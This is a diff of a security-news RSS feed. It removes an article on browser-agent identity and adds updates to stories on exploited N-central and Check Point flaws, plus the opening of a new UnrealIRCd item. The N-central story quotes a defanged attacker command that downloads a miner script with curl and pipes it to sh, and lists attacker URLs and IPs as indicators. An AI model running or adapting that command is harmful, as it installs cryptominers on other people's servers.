@@ -8,90 +8,9 @@
     <docs>http://www.rssboard.org/rss-specification</docs>
     <generator>python-feedgen</generator>
     <language>en</language>
-    <lastBuildDate>Sat, 14 Nov 2026 10:29:30 +0000</lastBuildDate>
-    <pubDate>Sat, 14 Nov 2026 10:29:30 +0000</pubDate>
+    <lastBuildDate>Sat, 14 Nov 2026 17:09:00 +0000</lastBuildDate>
+    <pubDate>Sat, 14 Nov 2026 17:09:00 +0000</pubDate>
     <ttl>60</ttl>
-    <item>
-      <title>We Built An Agent That Broke All of Our Security Rules. Here's What We Learned. (2026)</title>
-      <link>https://thehackernews.com/2026/11/we-built-agent-that-broke-all-of-our.html</link>
-      <description>&lt;div class="separator" style="clear: both;"&gt;&lt;a href="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhB22NtEOE6ioVcc92S5bLfFX3tbKyjNkx0j8OmHekqWq6Od4h9DtFmbmdd74VzwHCh5h6NbWnBgHgKzC49DwS7QAgA0uH3eL7BvBnN9QJu3U5-oiy5ZFMN7PvaJTBqjP7TR5VMjzrGxjfOfjgBqs3lecFZnWGEYNDp_BJgklco1L_acBqGm1M_CvtfLaY/s1600/AI-AGENT.png" style="display: block; padding: 1em 0; text-align: center; clear: left; float: left;"&gt;&lt;img alt="" border="0" data-original-height="470" data-original-width="900" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhB22NtEOE6ioVcc92S5bLfFX3tbKyjNkx0j8OmHekqWq6Od4h9DtFmbmdd74VzwHCh5h6NbWnBgHgKzC49DwS7QAgA0uH3eL7BvBnN9QJu3U5-oiy5ZFMN7PvaJTBqjP7TR5VMjzrGxjfOfjgBqs3lecFZnWGEYNDp_BJgklco1L_acBqGm1M_CvtfLaY/s1600/AI-AGENT.png" style="width:auto;height:auto;max-width:100%;max-height:450px;object-fit:contain;display:block;border-radius:4px;" loading="lazy" /&gt;&lt;/a&gt;&lt;/div&gt;
-&lt;p&gt;We tell customers three things about securing AI agents: they need their own identities, access that fits the job they’re given, and traceability that’s separate from any human’s. That was true for us at Token as well. Then, we built an agent that broke all three by default.&lt;/p&gt;
-&lt;p&gt;This helped us think through how such agents should be defended. When a browser agent acts inside a user’s authenticated session, the application may see the user but not the agent, the delegation, or the task’s intended scope. By creating an agent that breaks all the security rules, Token learned how companies should be using identity to gain control, especially as agent use scales. Standards are coming, but there are steps security teams can take today.&lt;/p&gt;
-&lt;h2&gt;&lt;strong&gt;The agent we would have flagged&lt;/strong&gt;&lt;/h2&gt;
-&lt;p&gt;The &lt;a href="https://www.token.security/blog/introducing-token-rehearsal-walkthrough-learning?utm_source=thehackernews&amp;amp;utm_medium=3rdparty&amp;amp;utm_campaign=thehackernews&amp;amp;utm_content=nov-11" target="_blank"&gt;agent we created is named Rehearsal&lt;/a&gt;. Its job is to answer questions inside the Token platform by doing rather than telling. It autonomously opens pages in the browser tab, sets filters, and fills in forms.&lt;/p&gt;
-&lt;p&gt;From a security perspective, it’s a typical UI agent that runs in the user’s browser. That’s what makes it useful. But it also means the agent runs within the user’s session and has their reach.&lt;/p&gt;
-&lt;p&gt;Moreover, to the server behind the page, the agent’s clicks are inherently indistinguishable from the user’s, because nothing in a session cookie points to who the session driver is.&lt;/p&gt;
-&lt;h2&gt;&lt;strong&gt;What controlling both sides made possible&lt;/strong&gt;&lt;/h2&gt;
-&lt;p&gt;Because Token owns both the agent and the app it runs, we can close each gap from the inside. For example, Token knows who’s driving the session because Rehearsal tells it who is.&lt;/p&gt;
-&lt;a name="more"&gt;&lt;/a&gt;
-&lt;p&gt;We learned that there are multiple best practices that you can apply when you control the AI agent itself:&lt;/p&gt;
-&lt;ul&gt;
-&lt;li&gt;While the agent moves, dim and lock the application and clearly indicate who has control.&lt;/li&gt;
-&lt;li&gt;Record every move for each session, including those that were blocked.&lt;/li&gt;
-&lt;li&gt;Reduce the agent’s reach below the user’s. For Rehearsal, we ensure the dashboards are read-only. It can’t save anything without the user’s approval, doesn’t fill in secret fields, and never sends a call that the platform has refused. It also understands the dashboard controls through the page’s accessibility labels.&lt;/li&gt;
-&lt;/ul&gt;
-&lt;p&gt;This works for our own agent, but only because it relies on access that no outside agent has.&lt;/p&gt;
-&lt;h2&gt;&lt;strong&gt;Who has to fix it for everyone else?&lt;/strong&gt;&lt;/h2&gt;
-&lt;p&gt;We could give Rehearsal an actor, a scope, and a page map because we're the ones who wrote it. A browser agent driving your CRM or your cloud console has none of that. The app can't tell that it’s there, and the agent can't tell which field holds a secret or which button deletes a record. The session itself carries the user's identity.&lt;/p&gt;
-&lt;p&gt;The way out is to give agents their own lanes, separate from human users'. The web has started building them, but it isn't necessarily focused on holistic approaches.&lt;/p&gt;
-&lt;p&gt;The browser can mark when its agent is driving and restrict itself accordingly. Chrome auto-browse, for example, already requires a person’s approval before high-stakes actions such as payments or mass emails, limits its agent to the sites the task requires, and tags the pages the agent visits in the user’s history. Microsoft lets admins turn agentic browsing on per site and pause it before passwords and card numbers are entered.&lt;/p&gt;
-&lt;p&gt;The app can publish its actions as tools. WebMCP, a draft that Google and Microsoft are writing in a W3C community group, lets a site expose actions that an agent can call directly and flag each one as read-only or consequential. That way, the agent doesn't need to guess what a button does.&lt;/p&gt;
-&lt;p&gt;The agent can sign its requests. Web Bot Auth, now an IETF working group draft, lets a site verify which agent sent a request.&lt;/p&gt;
-&lt;p&gt;What’s missing is a layer that connects them. Each lane knows something the others don’t, and none of them passes it on. The browser knows its agent is driving, but neither Chrome nor Edge describes how to tell the app on the other end. A WebMCP tool runs inside the user’s session, with the user’s rights, so it doesn’t, by itself, narrow what the agent can reach. Web Bot Auth names the agent, but the draft makes it plain that it doesn’t cover delegation, so it omits the person the agent works for.&lt;/p&gt;
-&lt;p&gt;The app ends up holding on to pieces of context rather than delivering something actionable.&lt;/p&gt;
-&lt;p&gt;Now consider that the agents are arriving faster than the standards. Agent-friendly isn’t enough on its own. Every lane built for agents should carry the agent’s identity, a verifiable link to the person it acts for, and a scope narrower than that person’s. Together, those three signals give an application the minimum context it needs to make an authorization decision. Otherwise, a faster lane is just a faster path to the misuse of privilege.&lt;/p&gt;
-&lt;h2&gt;&lt;strong&gt;What security teams can do before standards catch up&lt;/strong&gt;&lt;/h2&gt;
-&lt;p&gt;Waiting for standardization is not an option. You need to &lt;a href="https://www.token.security/book-a-demo?utm_source=thehackernews&amp;amp;utm_medium=3rdparty&amp;amp;utm_campaign=thehackernews&amp;amp;utm_content=nov-11" target="_blank"&gt;start discovering agentic browsers and extensions as soon as possible&lt;/a&gt;, including the users whose sessions they borrow. And while you can’t tell who clicked, you can choose which clicks need a person by adding a step-up check such as a passkey prompt. &lt;/p&gt;
-&lt;ul&gt;
-&lt;li&gt;Inventory browser agents, agentic extensions, and endpoint agents that can act through authenticated sessions and map them to users and owners.&lt;/li&gt;
-&lt;li&gt;Trace every AI agent consumer, so you know which people (and other agents) are using each individual agent&lt;/li&gt;
-&lt;li&gt;Review every identity that each individual agent has access to&lt;/li&gt;
-&lt;li&gt;Identify potential attack paths that use agents to bypass access controls&lt;/li&gt;
-&lt;li&gt;Require explicit approval or step-up authentication before sensitive or irreversible application actions.&lt;/li&gt;
-&lt;li&gt;Ask critical SaaS vendors whether their audit records distinguish agent activity from human activity and whether they support task-scoped delegation.&lt;/li&gt;
-&lt;/ul&gt;
-&lt;p&gt;Until browsers and applications can carry agent identity, human delegation, and task scope together, companies should treat every agent using a human session as delegated access that must be discovered, constrained, and audited.&lt;/p&gt;</description>
-      <content:encoded>&lt;div class="separator" style="clear: both;"&gt;&lt;a href="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhB22NtEOE6ioVcc92S5bLfFX3tbKyjNkx0j8OmHekqWq6Od4h9DtFmbmdd74VzwHCh5h6NbWnBgHgKzC49DwS7QAgA0uH3eL7BvBnN9QJu3U5-oiy5ZFMN7PvaJTBqjP7TR5VMjzrGxjfOfjgBqs3lecFZnWGEYNDp_BJgklco1L_acBqGm1M_CvtfLaY/s1600/AI-AGENT.png" style="display: block; padding: 1em 0; text-align: center; clear: left; float: left;"&gt;&lt;img alt="" border="0" data-original-height="470" data-original-width="900" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhB22NtEOE6ioVcc92S5bLfFX3tbKyjNkx0j8OmHekqWq6Od4h9DtFmbmdd74VzwHCh5h6NbWnBgHgKzC49DwS7QAgA0uH3eL7BvBnN9QJu3U5-oiy5ZFMN7PvaJTBqjP7TR5VMjzrGxjfOfjgBqs3lecFZnWGEYNDp_BJgklco1L_acBqGm1M_CvtfLaY/s1600/AI-AGENT.png" style="width:auto;height:auto;max-width:100%;max-height:450px;object-fit:contain;display:block;border-radius:4px;" loading="lazy" /&gt;&lt;/a&gt;&lt;/div&gt;
-&lt;p&gt;We tell customers three things about securing AI agents: they need their own identities, access that fits the job they’re given, and traceability that’s separate from any human’s. That was true for us at Token as well. Then, we built an agent that broke all three by default.&lt;/p&gt;
-&lt;p&gt;This helped us think through how such agents should be defended. When a browser agent acts inside a user’s authenticated session, the application may see the user but not the agent, the delegation, or the task’s intended scope. By creating an agent that breaks all the security rules, Token learned how companies should be using identity to gain control, especially as agent use scales. Standards are coming, but there are steps security teams can take today.&lt;/p&gt;
-&lt;h2&gt;&lt;strong&gt;The agent we would have flagged&lt;/strong&gt;&lt;/h2&gt;
-&lt;p&gt;The &lt;a href="https://www.token.security/blog/introducing-token-rehearsal-walkthrough-learning?utm_source=thehackernews&amp;amp;utm_medium=3rdparty&amp;amp;utm_campaign=thehackernews&amp;amp;utm_content=nov-11" target="_blank"&gt;agent we created is named Rehearsal&lt;/a&gt;. Its job is to answer questions inside the Token platform by doing rather than telling. It autonomously opens pages in the browser tab, sets filters, and fills in forms.&lt;/p&gt;
-&lt;p&gt;From a security perspective, it’s a typical UI agent that runs in the user’s browser. That’s what makes it useful. But it also means the agent runs within the user’s session and has their reach.&lt;/p&gt;
-&lt;p&gt;Moreover, to the server behind the page, the agent’s clicks are inherently indistinguishable from the user’s, because nothing in a session cookie points to who the session driver is.&lt;/p&gt;
-&lt;h2&gt;&lt;strong&gt;What controlling both sides made possible&lt;/strong&gt;&lt;/h2&gt;
-&lt;p&gt;Because Token owns both the agent and the app it runs, we can close each gap from the inside. For example, Token knows who’s driving the session because Rehearsal tells it who is.&lt;/p&gt;
-&lt;a name="more"&gt;&lt;/a&gt;
-&lt;p&gt;We learned that there are multiple best practices that you can apply when you control the AI agent itself:&lt;/p&gt;
-&lt;ul&gt;
-&lt;li&gt;While the agent moves, dim and lock the application and clearly indicate who has control.&lt;/li&gt;
-&lt;li&gt;Record every move for each session, including those that were blocked.&lt;/li&gt;
-&lt;li&gt;Reduce the agent’s reach below the user’s. For Rehearsal, we ensure the dashboards are read-only. It can’t save anything without the user’s approval, doesn’t fill in secret fields, and never sends a call that the platform has refused. It also understands the dashboard controls through the page’s accessibility labels.&lt;/li&gt;
-&lt;/ul&gt;
-&lt;p&gt;This works for our own agent, but only because it relies on access that no outside agent has.&lt;/p&gt;
-&lt;h2&gt;&lt;strong&gt;Who has to fix it for everyone else?&lt;/strong&gt;&lt;/h2&gt;
-&lt;p&gt;We could give Rehearsal an actor, a scope, and a page map because we're the ones who wrote it. A browser agent driving your CRM or your cloud console has none of that. The app can't tell that it’s there, and the agent can't tell which field holds a secret or which button deletes a record. The session itself carries the user's identity.&lt;/p&gt;
-&lt;p&gt;The way out is to give agents their own lanes, separate from human users'. The web has started building them, but it isn't necessarily focused on holistic approaches.&lt;/p&gt;
-&lt;p&gt;The browser can mark when its agent is driving and restrict itself accordingly. Chrome auto-browse, for example, already requires a person’s approval before high-stakes actions such as payments or mass emails, limits its agent to the sites the task requires, and tags the pages the agent visits in the user’s history. Microsoft lets admins turn agentic browsing on per site and pause it before passwords and card numbers are entered.&lt;/p&gt;
-&lt;p&gt;The app can publish its actions as tools. WebMCP, a draft that Google and Microsoft are writing in a W3C community group, lets a site expose actions that an agent can call directly and flag each one as read-only or consequential. That way, the agent doesn't need to guess what a button does.&lt;/p&gt;
-&lt;p&gt;The agent can sign its requests. Web Bot Auth, now an IETF working group draft, lets a site verify which agent sent a request.&lt;/p&gt;
-&lt;p&gt;What’s missing is a layer that connects them. Each lane knows something the others don’t, and none of them passes it on. The browser knows its agent is driving, but neither Chrome nor Edge describes how to tell the app on the other end. A WebMCP tool runs inside the user’s session, with the user’s rights, so it doesn’t, by itself, narrow what the agent can reach. Web Bot Auth names the agent, but the draft makes it plain that it doesn’t cover delegation, so it omits the person the agent works for.&lt;/p&gt;
-&lt;p&gt;The app ends up holding on to pieces of context rather than delivering something actionable.&lt;/p&gt;
-&lt;p&gt;Now consider that the agents are arriving faster than the standards. Agent-friendly isn’t enough on its own. Every lane built for agents should carry the agent’s identity, a verifiable link to the person it acts for, and a scope narrower than that person’s. Together, those three signals give an application the minimum context it needs to make an authorization decision. Otherwise, a faster lane is just a faster path to the misuse of privilege.&lt;/p&gt;
-&lt;h2&gt;&lt;strong&gt;What security teams can do before standards catch up&lt;/strong&gt;&lt;/h2&gt;
-&lt;p&gt;Waiting for standardization is not an option. You need to &lt;a href="https://www.token.security/book-a-demo?utm_source=thehackernews&amp;amp;utm_medium=3rdparty&amp;amp;utm_campaign=thehackernews&amp;amp;utm_content=nov-11" target="_blank"&gt;start discovering agentic browsers and extensions as soon as possible&lt;/a&gt;, including the users whose sessions they borrow. And while you can’t tell who clicked, you can choose which clicks need a person by adding a step-up check such as a passkey prompt. &lt;/p&gt;
-&lt;ul&gt;
-&lt;li&gt;Inventory browser agents, agentic extensions, and endpoint agents that can act through authenticated sessions and map them to users and owners.&lt;/li&gt;
-&lt;li&gt;Trace every AI agent consumer, so you know which people (and other agents) are using each individual agent&lt;/li&gt;
-&lt;li&gt;Review every identity that each individual agent has access to&lt;/li&gt;
-&lt;li&gt;Identify potential attack paths that use agents to bypass access controls&lt;/li&gt;
-&lt;li&gt;Require explicit approval or step-up authentication before sensitive or irreversible application actions.&lt;/li&gt;
-&lt;li&gt;Ask critical SaaS vendors whether their audit records distinguish agent activity from human activity and whether they support task-scoped delegation.&lt;/li&gt;
-&lt;/ul&gt;
-&lt;p&gt;Until browsers and applications can carry agent identity, human delegation, and task scope together, companies should treat every agent using a human session as delegated access that must be discovered, constrained, and audited.&lt;/p&gt;</content:encoded>
-      <guid isPermaLink="false">https://thehackernews.com/2026/11/we-built-agent-that-broke-all-of-our.html</guid>
-      <category>cyber</category>
-      <pubDate>Wed, 11 Nov 2026 17:31:59 +0530</pubDate>
-    </item>
     <item>
       <title>Over 35,000 Grok-Built Apps Exposed Online, Some Leaking Confidential Data and Passwords (2026)</title>
       <link>https://thehackernews.com/2026/11/over-35000-grok-built-apps-exposed.html</link>
@@ -2275,7 +2194,31 @@
 &lt;p&gt;Cybersecurity company Huntback has also revealed that the same IP address is weaponizing the 4EverAble2Shell flaw, deploying an XMRig Monero cryptocurrency miner on 21 N-central servers via the aforementioned shell script -&lt;/p&gt;
 &lt;pre&gt;&lt;code&gt;mount -o remount,exec /tmp 2&amp;gt;/dev/null; curl -fsSL hxxp://157.20.241[.]16:8080/jup.sh | sh -s nc_[target-IP-redacted]&lt;/code&gt;&lt;/pre&gt;
 &lt;p&gt;The miner is designed to use only half of the available CPU cores, likely in an effort to fly under the radar. The compromised N-central servers are concentrated across the U.S., South Africa, Canada, the U.K., Germany, France, and Sweden.&lt;/p&gt;
-&lt;p&gt;"The miner is the only payload we have seen, but the escalation hands the operator root on a host that manages your customers' endpoints," Huntback &lt;a href="https://huntback.io/blog/ncentral-4everable2shell-miners-on-live-servers" target="_blank"&gt;said&lt;/a&gt;. "Treat a hit as a full compromise, not a cleanup job. Applying Hotfix 2 is not enough on its own: 19 of the victims here were already running it."&lt;/p&gt;</description>
+&lt;p&gt;"The miner is the only payload we have seen, but the escalation hands the operator root on a host that manages your customers' endpoints," Huntback &lt;a href="https://huntback.io/blog/ncentral-4everable2shell-miners-on-live-servers" target="_blank"&gt;said&lt;/a&gt;. "Treat a hit as a full compromise, not a cleanup job. Applying Hotfix 2 is not enough on its own: 19 of the victims here were already running it."&lt;/p&gt;
+&lt;h3&gt;Update&lt;/h3&gt;
+&lt;p&gt;N-able has confirmed that threat actors are targeting customers who have not disabled the Legacy API. It has shared the following indicators of compromise (IoCs) -&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;
+    URLs:
+    &lt;ul&gt;
+&lt;li&gt;157.20.241[.]16:8080/jup.sh&lt;/li&gt;
+&lt;li&gt;157.20.241[.]16:8080/xvgz&lt;/li&gt;
+&lt;li&gt;157.20.241[.]16:8080/xmrig.tgz&lt;/li&gt;
+&lt;li&gt;157.20.241[.]16:8080/ob/cronhit?h=jup_start_&amp;lt;rig&amp;gt;&amp;amp;persist=&amp;lt;method&amp;gt;&lt;/li&gt;
+&lt;li&gt;157.20.241[.]16:8080/ob/fcheck&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;
+    Outbound traffic:
+    &lt;ul&gt;
+&lt;li&gt;157.20.241[.]16 (ports 8080, 19202 to 19418)&lt;/li&gt;
+&lt;li&gt;139.99.69[.]109:10128&lt;/li&gt;
+&lt;li&gt;79.76.51[.]56:39100&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;It's worth noting that the IP address "157.20.241[.]16" matches the activity detailed by Previdian and Huntback.&lt;/p&gt;
+&lt;p&gt;"We remain committed to completing the necessary security assessments and remediation efforts while prioritizing the protection of our customers and their environments," the company said.&lt;/p&gt;</description>
       <content:encoded>&lt;div class="separator" style="clear: both;"&gt;&lt;a href="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhA4jxlXpPBPhD5o3IHy80Fn7fSHUtcqH3iXQlU-jDUL5C3zJcf1_Zb-GAYxuW6P6q647p9JAT_opImlj-v-USDNhZ_z83mYC3ISKtN72pe_3XLwf5EyMRuK4OdXCFnYxGMhOAvN_i4UFqk5vJLriRnkbRRwILuT5JUpExx9Tm74sXSCQ0g7jjsOzWV1cqk/s1600/nable-hacks.jpg" style="clear: left; display: block; float: left; padding: 1em 0px; text-align: center;"&gt;&lt;img alt="" border="0" data-original-height="471" data-original-width="901" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhA4jxlXpPBPhD5o3IHy80Fn7fSHUtcqH3iXQlU-jDUL5C3zJcf1_Zb-GAYxuW6P6q647p9JAT_opImlj-v-USDNhZ_z83mYC3ISKtN72pe_3XLwf5EyMRuK4OdXCFnYxGMhOAvN_i4UFqk5vJLriRnkbRRwILuT5JUpExx9Tm74sXSCQ0g7jjsOzWV1cqk/s1600/nable-hacks.jpg" style="width:auto;height:auto;max-width:100%;max-height:450px;object-fit:contain;display:block;border-radius:4px;" loading="lazy" /&gt;&lt;/a&gt;&lt;/div&gt;
 &lt;p&gt;N-able on Thursday said it's taking additional precautions in the wake of public disclosure of a new set of flaws tracked as &lt;a href="https://thehackernews.com/2026/11/new-n-central-exploits-work-against.html" target="_blank"&gt;4EverAble2Shell and Agent2Shell&lt;/a&gt;.&lt;/p&gt;
 &lt;p&gt;"We are restricting certain N-central features and integrations," the company &lt;a href="https://uptime.n-able.com/" target="_blank"&gt;said&lt;/a&gt; in a Thursday update. "These measures may affect some functionality, but we believe taking additional precautions while remediation is completed is the right action to protect our partners and their customers."&lt;/p&gt;
@@ -2300,7 +2243,31 @@
 &lt;p&gt;Cybersecurity company Huntback has also revealed that the same IP address is weaponizing the 4EverAble2Shell flaw, deploying an XMRig Monero cryptocurrency miner on 21 N-central servers via the aforementioned shell script -&lt;/p&gt;
 &lt;pre&gt;&lt;code&gt;mount -o remount,exec /tmp 2&amp;gt;/dev/null; curl -fsSL hxxp://157.20.241[.]16:8080/jup.sh | sh -s nc_[target-IP-redacted]&lt;/code&gt;&lt;/pre&gt;
 &lt;p&gt;The miner is designed to use only half of the available CPU cores, likely in an effort to fly under the radar. The compromised N-central servers are concentrated across the U.S., South Africa, Canada, the U.K., Germany, France, and Sweden.&lt;/p&gt;
-&lt;p&gt;"The miner is the only payload we have seen, but the escalation hands the operator root on a host that manages your customers' endpoints," Huntback &lt;a href="https://huntback.io/blog/ncentral-4everable2shell-miners-on-live-servers" target="_blank"&gt;said&lt;/a&gt;. "Treat a hit as a full compromise, not a cleanup job. Applying Hotfix 2 is not enough on its own: 19 of the victims here were already running it."&lt;/p&gt;</content:encoded>
+&lt;p&gt;"The miner is the only payload we have seen, but the escalation hands the operator root on a host that manages your customers' endpoints," Huntback &lt;a href="https://huntback.io/blog/ncentral-4everable2shell-miners-on-live-servers" target="_blank"&gt;said&lt;/a&gt;. "Treat a hit as a full compromise, not a cleanup job. Applying Hotfix 2 is not enough on its own: 19 of the victims here were already running it."&lt;/p&gt;
+&lt;h3&gt;Update&lt;/h3&gt;
+&lt;p&gt;N-able has confirmed that threat actors are targeting customers who have not disabled the Legacy API. It has shared the following indicators of compromise (IoCs) -&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;
+    URLs:
+    &lt;ul&gt;
+&lt;li&gt;157.20.241[.]16:8080/jup.sh&lt;/li&gt;
+&lt;li&gt;157.20.241[.]16:8080/xvgz&lt;/li&gt;
+&lt;li&gt;157.20.241[.]16:8080/xmrig.tgz&lt;/li&gt;
+&lt;li&gt;157.20.241[.]16:8080/ob/cronhit?h=jup_start_&amp;lt;rig&amp;gt;&amp;amp;persist=&amp;lt;method&amp;gt;&lt;/li&gt;
+&lt;li&gt;157.20.241[.]16:8080/ob/fcheck&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;
+    Outbound traffic:
+    &lt;ul&gt;
+&lt;li&gt;157.20.241[.]16 (ports 8080, 19202 to 19418)&lt;/li&gt;
+&lt;li&gt;139.99.69[.]109:10128&lt;/li&gt;
+&lt;li&gt;79.76.51[.]56:39100&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;It's worth noting that the IP address "157.20.241[.]16" matches the activity detailed by Previdian and Huntback.&lt;/p&gt;
+&lt;p&gt;"We remain committed to completing the necessary security assessments and remediation efforts while prioritizing the protection of our customers and their environments," the company said.&lt;/p&gt;</content:encoded>
       <guid isPermaLink="false">https://thehackernews.com/2026/11/hackers-exploit-n-central-flaws-to.html</guid>
       <category>cyber</category>
       <pubDate>Fri, 13 Nov 2026 11:13:28 +0530</pubDate>
@@ -2346,7 +2313,9 @@
 &lt;li&gt;Use of wiper malware&lt;/li&gt;
 &lt;li&gt;Focus on Israel and explicit references to the Israeli-Palestine conflict in the wiper note&lt;/li&gt;
 &lt;/ul&gt;
-&lt;p&gt;"Taken together, the evidence does not allow us to assess with high confidence the true nature of this operation," Check Point said. "Several scenarios remain plausible: the identified actor ran the entire campaign, acted solely as an initial access broker, or took part in a false-flag operation. It is also possible that the destructive activity served as a smoke screen."&lt;/p&gt;</description>
+&lt;p&gt;"Taken together, the evidence does not allow us to assess with high confidence the true nature of this operation," Check Point said. "Several scenarios remain plausible: the identified actor ran the entire campaign, acted solely as an initial access broker, or took part in a false-flag operation. It is also possible that the destructive activity served as a smoke screen."&lt;/p&gt;
+&lt;h3&gt;Update&lt;/h3&gt;
+&lt;p&gt;The U.S. Cybersecurity and Infrastructure Security Agency, on November 13, 2026, &lt;a href="https://www.cisa.gov/news-events/alerts/2026/11/13/cisa-adds-two-known-exploited-vulnerabilities-catalog" target="_blank"&gt;added&lt;/a&gt; CVE-2026-123039 to its Known Exploited Vulnerabilities (&lt;a href="https://www.cisa.gov/known-exploited-vulnerabilities-catalog" target="_blank"&gt;KEV&lt;/a&gt;) catalog, requiring federal agencies to apply the patch by November 16, 2026.&lt;/p&gt;</description>
       <content:encoded>&lt;div class="separator" style="clear: both;"&gt;&lt;a href="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjP3B9ZQG1BXlSPUWzwVJ5qgwh899Ngm9u2GAbWiX5HDqhhT6q6gsmva9-TR2upR0fepas2i0k53VUxh1CH21LeUUv1Ipczl9huExytcqNdlqIoHP64CRYJuGyHe-OgLoov-JR6GziUT4JDJ92Ne83CshfWn9pr9Bt2HPKkv4phQJ2esJHcV6eZqzRretVu/s1600/php.jpg" style="display: block; padding: 1em 0; text-align: center; clear: left; float: left;"&gt;&lt;img alt="" border="0" data-original-height="471" data-original-width="901" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjP3B9ZQG1BXlSPUWzwVJ5qgwh899Ngm9u2GAbWiX5HDqhhT6q6gsmva9-TR2upR0fepas2i0k53VUxh1CH21LeUUv1Ipczl9huExytcqNdlqIoHP64CRYJuGyHe-OgLoov-JR6GziUT4JDJ92Ne83CshfWn9pr9Bt2HPKkv4phQJ2esJHcV6eZqzRretVu/s1600/php.jpg" style="width:auto;height:auto;max-width:100%;max-height:450px;object-fit:contain;display:block;border-radius:4px;" loading="lazy" /&gt;&lt;/a&gt;&lt;/div&gt;
 &lt;p&gt;An unknown threat actor has been observed targeting unpatched Check Point Security Gateways to obtain initial access via the &lt;a href="https://thehackernews.com/2026/10/php2shell-exploitation-hits-government.html" target="_blank"&gt;PHP2Shell&lt;/a&gt; vulnerabilities and then a previously unreported local privilege escalation flaw in Gaia OS  to deploy a backdoor called &lt;strong&gt;TSGA&lt;/strong&gt;.&lt;/p&gt;
 &lt;p&gt;The activity, &lt;a href="https://research.checkpoint.com/2026/php2shell-exploitation-on-check-point-gateway/" target="_blank"&gt;detailed&lt;/a&gt; by Check Point, began on October 30, 2026, and targeted Israeli organizations, with a broader follow-up wave on November 2, 2026, that targeted organizations across multiple countries and sectors. Some of the organizations singled out in the first wave have also been at the receiving end of destructive actions that include the deployment of wiper malware.&lt;/p&gt;
@@ -2385,7 +2354,9 @@
 &lt;li&gt;Use of wiper malware&lt;/li&gt;
 &lt;li&gt;Focus on Israel and explicit references to the Israeli-Palestine conflict in the wiper note&lt;/li&gt;
 &lt;/ul&gt;
-&lt;p&gt;"Taken together, the evidence does not allow us to assess with high confidence the true nature of this operation," Check Point said. "Several scenarios remain plausible: the identified actor ran the entire campaign, acted solely as an initial access broker, or took part in a false-flag operation. It is also possible that the destructive activity served as a smoke screen."&lt;/p&gt;</content:encoded>
+&lt;p&gt;"Taken together, the evidence does not allow us to assess with high confidence the true nature of this operation," Check Point said. "Several scenarios remain plausible: the identified actor ran the entire campaign, acted solely as an initial access broker, or took part in a false-flag operation. It is also possible that the destructive activity served as a smoke screen."&lt;/p&gt;
+&lt;h3&gt;Update&lt;/h3&gt;
+&lt;p&gt;The U.S. Cybersecurity and Infrastructure Security Agency, on November 13, 2026, &lt;a href="https://www.cisa.gov/news-events/alerts/2026/11/13/cisa-adds-two-known-exploited-vulnerabilities-catalog" target="_blank"&gt;added&lt;/a&gt; CVE-2026-123039 to its Known Exploited Vulnerabilities (&lt;a href="https://www.cisa.gov/known-exploited-vulnerabilities-catalog" target="_blank"&gt;KEV&lt;/a&gt;) catalog, requiring federal agencies to apply the patch by November 16, 2026.&lt;/p&gt;</content:encoded>
       <guid isPermaLink="false">https://thehackernews.com/2026/11/hackers-exploit-php2shell-flaws-in.html</guid>
       <category>cyber</category>
       <pubDate>Fri, 13 Nov 2026 13:35:49 +0530</pubDate>
@@ -3152,6 +3123,31 @@
       <guid isPermaLink="false">https://thehackernews.com/2026/11/postgresql-patches-52-flaws-including.html</guid>
       <category>cyber</category>
       <pubDate>Fri, 13 Nov 2026 22:23:08 +0530</pubDate>
+    </item>
+    <item>
+      <title>Attackers Exploit UnrealIRCd Flaw That Enables Server-Level Command Injection (2026)</title>
+      <link>https://thehackernews.com/2026/11/attackers-exploit-unrealircd-flaw-that.html</link>
+      <description>&lt;div class="separator" style="clear: both;"&gt;&lt;a href="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjuvSsWcsJ9736KXp_0s-6__-CiI5PD71VReembVHAB4cfnv3Qti8td9WR54UnRH96bz30dvbTQxwG3WbxDkWRq_eFJPYLgxbAzRD5k3MJSISbW2VDI-Fr7nlX4j8NyJkXqLHylMZMXpynEHVV8ovZ2YPC-WGCFCcrOZOeGc5Wsy-jRjjbcyYTzojI9Nudw/s1600/cisaa.jpg" style="display: block; padding: 1em 0; text-align: center; clear: left; float: left;"&gt;&lt;img alt="" border="0" data-original-height="470" data-original-width="900" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjuvSsWcsJ9736KXp_0s-6__-CiI5PD71VReembVHAB4cfnv3Qti8td9WR54UnRH96bz30dvbTQxwG3WbxDkWRq_eFJPYLgxbAzRD5k3MJSISbW2VDI-Fr7nlX4j8NyJkXqLHylMZMXpynEHVV8ovZ2YPC-WGCFCcrOZOeGc5Wsy-jRjjbcyYTzojI9Nudw/s1600/cisaa.jpg" style="width:auto;height:auto;max-width:100%;max-height:450px;object-fit:contain;display:block;border-radius:4px;" loading="lazy" /&gt;&lt;/a&gt;&lt;/div&gt;
+&lt;p&gt;The U.S. Cybersecurity and Infrastructure Security Agency (CISA) on Friday &lt;a href="https://www.cisa.gov/news-events/alerts/2026/11/13/cisa-adds-two-known-exploited-vulnerabilities-catalog" target="_blank"&gt;added&lt;/a&gt; a high-severity security flaw impacting UnrealIRCd, an open-source Internet Relay Chat (IRC) server, to its Known Exploited Vulnerabilities (&lt;a href="https://www.cisa.gov/known-exploited-vulnerabilities-catalog" target="_blank"&gt;KEV&lt;/a&gt;) catalog, following reports of active exploitation.&lt;/p&gt;
+&lt;p&gt;The vulnerability, tracked as CVE-2026-114713 (CVSS score: 8.6), is a case of improper neutralization of delimiters that could be used to execute arbitrary commands with server/IRCOp privileges.&lt;/p&gt;
